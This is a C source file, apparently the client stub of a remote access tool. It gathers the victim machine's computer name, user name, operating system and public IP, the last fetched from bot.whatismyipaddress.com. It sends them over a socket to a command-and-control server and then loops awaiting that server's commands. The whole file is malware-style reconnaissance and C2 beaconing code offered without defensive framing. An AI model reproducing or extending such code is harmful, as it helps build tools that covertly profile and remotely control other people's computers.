#ifdef _WIN32
	char OS[] = "Windows";
#else
	char OS[] = "Other";
#endif

#include "stub.h"

#define SYS_INFO_LEN 32767

extern SOCKET sock_fd;

char info[] = "info";
char Close[] = "close";

char command[1024];
char wan_ip[1024];
char computer_name[SYS_INFO_LEN];
char user_name[SYS_INFO_LEN];

DWORD sys_ret = SYS_INFO_LEN;

void WanIpLocate(){

	HINTERNET hInternet, hFile;

	DWORD bytesRead;

	if((hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0)) == NULL){

		InternetCloseHandle(hInternet);

		return;
	}

	if((hFile  = InternetOpenUrl(hInternet, "http://bot.whatismyipaddress.com/", NULL, 0, INTERNET_FLAG_RELOAD, NULL)) == NULL){

		InternetCloseHandle(hInternet);

		return;

	}

	InternetReadFile(hFile, wan_ip, DWORD(sizeof(wan_ip)), &bytesRead);

	InternetCloseHandle(hFile);

	InternetCloseHandle(hInternet);
}

void RetrieveSystemInfo(){

	WanIpLocate();

	//Send Computer Name First
	if(!GetComputerName(computer_name, &sys_ret)){
		CloseSocket();
	}

	SendData(sock_fd, computer_name);

	MessageBox(NULL, computer_name, "Sent computer name", MB_OK);


	//Send Current User Name
	sys_ret = SYS_INFO_LEN;

	if(!GetUserName(user_name, &sys_ret)){
		CloseSocket();
	}

	SendData(sock_fd, user_name);

	MessageBox(NULL, user_name, "Sent User Name", MB_OK);

	//Send OS
	SendData(sock_fd, OS);

	MessageBox(NULL, OS, "Sending OS", MB_OK);


	//Send WanIp
	SendData(sock_fd, wan_ip);

}

void Shell(){

	while(1){

		//Start Receiving Commands From C2Server
		RecvData(sock_fd, command);

		MessageBox(NULL, command, "CommandRecieved", MB_OK);

		//Figure Out What command was sent
		if(strncmp(command, info, strlen(info)) == 0){

//			MessageBox(NULL, "In Info", NULL, NULL);

			RetrieveSystemInfo();

		} else if(strncmp(command, Close, strlen(Close)) == 0){

			break;

		}

	}

}
